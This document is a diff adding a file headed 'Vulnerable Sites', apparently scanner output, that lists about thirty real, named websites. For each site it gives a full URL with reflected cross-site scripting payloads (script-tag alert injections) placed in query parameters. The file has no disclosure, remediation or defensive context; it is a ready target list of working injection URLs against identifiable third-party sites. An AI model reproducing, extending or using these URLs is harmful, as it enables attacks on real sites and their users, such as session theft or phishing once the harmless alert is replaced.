@@ -1,0 +1,104 @@
+Vulnerable Sites:
+--------------------------------------
+www.semsk.kz/newscat.phpPatterns:
++	http://www.semsk.kz/newscat.php?id="><script>alert('XSS');</script>&
+--------------------------------------
+www.oasa.gr/newscat.phpPatterns:
++	http://www.oasa.gr/newscat.php?id="><script>alert('XSS');</script>&lang="><script>alert('XSS');</script>&
+--------------------------------------
+www.wtap.com/newsPatterns:
++	https://www.wtap.com/news?cat="><script>alert('XSS');</script>&cat_type="><script>alert('XSS');</script>&path="><script>alert('XSS');</script>&
+--------------------------------------
+www.wibw.com/newsPatterns:
++	https://www.wibw.com/news?cat="><script>alert('XSS');</script>&cat_type="><script>alert('XSS');</script>&path="><script>alert('XSS');</script>&
+--------------------------------------
+www.wymt.com/newsPatterns:
++	https://www.wymt.com/news?cat="><script>alert('XSS');</script>&path="><script>alert('XSS');</script>&
+--------------------------------------
+www.us.marantz.com/us/products/pages/productdetails.aspxPatterns:
++	https://www.us.marantz.com/us/products/pages/productdetails.aspx?catid="><script>alert('XSS');</script>&productid="><script>alert('XSS');</script>&
+--------------------------------------
+www.ktuu.com/news/Patterns:
++	https://www.ktuu.com/news/?path="><script>alert('XSS');</script>&cat="><script>alert('XSS');</script>&
+--------------------------------------
+support.lexmark.com/indexPatterns:
++	http://support.lexmark.com/index?page=content&id=SO1117&segment=SUPPORTproductCode%3D&productCode=LEXMARK_Z705&locale=de&userlocale=DE_DE&"><script>alert('XSS');</script>
+--------------------------------------
+www.zurrschienen.com/index.phpPatterns:
++	http://www.zurrschienen.com/index.php?option=com_content&view=article&id=6&Itemid=123&lang=de&"><script>alert('XSS');</script>
+--------------------------------------
+www.absima.shop/pp/absima-redcat-crawler-gen7pro-black-edition.htmPatterns:
++	https://www.absima.shop/pp/absima-redcat-crawler-gen7pro-black-edition.htm?shop=absima&SessionId=&a=article&ProdNr=RC00001&t=17960&c=19053&p=19053&"><script>alert('XSS');</script>
+--------------------------------------
+www.epc.eu/pub_details.phpPatterns:
++	http://www.epc.eu/pub_details.php?cat_id="><script>alert('XSS');</script>&pub_id="><script>alert('XSS');</script>&
+--------------------------------------
+www.galwayeast.com/showCategory.phpPatterns:
++	http://www.galwayeast.com/showCategory.php?cat_id="><script>alert('XSS');</script>&
+--------------------------------------
+www.gurumama.ca/product-list.phpPatterns:
++	http://www.gurumama.ca/product-list.php?cat_id="><script>alert('XSS');</script>&
+--------------------------------------
+acrpub.com/journal.phpPatterns:
++	http://acrpub.com/journal.php?cat_id="><script>alert('XSS');</script>&
+--------------------------------------
+law.mc.edu/catalog/index.phpPatterns:
++	https://law.mc.edu/catalog/index.php?cat_id="><script>alert('XSS');</script>&
+--------------------------------------
+www.altenburg.eu/sixcms/detail.phpPatterns:
++	https://www.altenburg.eu/sixcms/detail.php?id=11685&"><script>alert('XSS');</script>
+--------------------------------------
+www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080Patterns:
++	http://www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080?www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080&"><script>alert('XSS');</script>
++	http://www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id=5080?www.vid.ee/ru/video/news/dobroe_utro_tallinn/cat_id="><script>alert('XSS');</script>&
+--------------------------------------
+www.akurat-immobilien.de/immobilien-details.xhtmlPatterns:
++	https://www.akurat-immobilien.de/immobilien-details.xhtml?id[obj0]="><script>alert('XSS');</script>&
+--------------------------------------
+www.kmvt.com/newsPatterns:
++	https://www.kmvt.com/news?cat="><script>alert('XSS');</script>&cat_type="><script>alert('XSS');</script>&path="><script>alert('XSS');</script>&
+--------------------------------------
+ys-tech.force.com/heatproof_topics_categoryPatterns:
++	http://ys-tech.force.com/heatproof_topics_category?NewsCat="><script>alert('XSS');</script>&
+--------------------------------------
+ys-tech.secure.force.com/topics_categoryPatterns:
++	https://ys-tech.secure.force.com/topics_category?NewsCat="><script>alert('XSS');</script>&
+--------------------------------------
+www.terratec.de/page.phpPatterns:
++	https://www.terratec.de/page.php?page=/support/&"><script>alert('XSS');</script>
+--------------------------------------
+support.lexmark.com/indexPatterns:
++	http://support.lexmark.com/index?page=driverSupport&locale=DE&userlocale=DE_DE&"><script>alert('XSS');</script>
+--------------------------------------
+www.vespaclub.de/index.phpPatterns:
++	http://www.vespaclub.de/index.php?pageid="><script>alert('XSS');</script>&
+--------------------------------------
+www.camping-bergen.de/index.phpPatterns:
++	http://www.camping-bergen.de/index.php?pageID="><script>alert('XSS');</script>&
+--------------------------------------
+www.stmz.ch/de/index.phpPatterns:
++	https://www.stmz.ch/de/index.php?page=8&pageId=20&"><script>alert('XSS');</script>
++	https://www.stmz.ch/de/index.php?page="><script>alert('XSS');</script>&pageId="><script>alert('XSS');</script>&
+--------------------------------------
+zinzinotest.com/Patterns:
++	https://zinzinotest.com/?pageID=1&openLevel=19&langID=de&"><script>alert('XSS');</script>
++	https://zinzinotest.com/?pageID="><script>alert('XSS');</script>&openLevel="><script>alert('XSS');</script>&langID="><script>alert('XSS');</script>&
+--------------------------------------
+www.weinburg.eu/Patterns:
++	http://www.weinburg.eu/?pageID="><script>alert('XSS');</script>&
+--------------------------------------
+www.westticket.de/-Tickets-3671/Patterns:
++	https://www.westticket.de/-Tickets-3671/?evLId=78918&pageId=3671&"><script>alert('XSS');</script>
+--------------------------------------
+www.stuttgart.de/baeder/index.phpPatterns:
++	https://www.stuttgart.de/baeder/index.php?objecttype="><script>alert('XSS');</script>&id="><script>alert('XSS');</script>&pageID="><script>alert('XSS');</script>&
+--------------------------------------
+www.artgalerie-deutschland.de/top2.phpPatterns:
++	https://www.artgalerie-deutschland.de/top2.php?cat_id=195&"><script>alert('XSS');</script>
+--------------------------------------
+www.guessthespot.com/index.phpPatterns:
++	http://www.guessthespot.com/index.php?cat_id="><script>alert('XSS');</script>&
+--------------------------------------
+3lpublishing.flyingcart.com/Patterns:
++	http://3lpublishing.flyingcart.com/?p="><script>alert('XSS');</script>&pid="><script>alert('XSS');</script>&cat_id="><script>alert('XSS');</script>&
+--------------------------------------
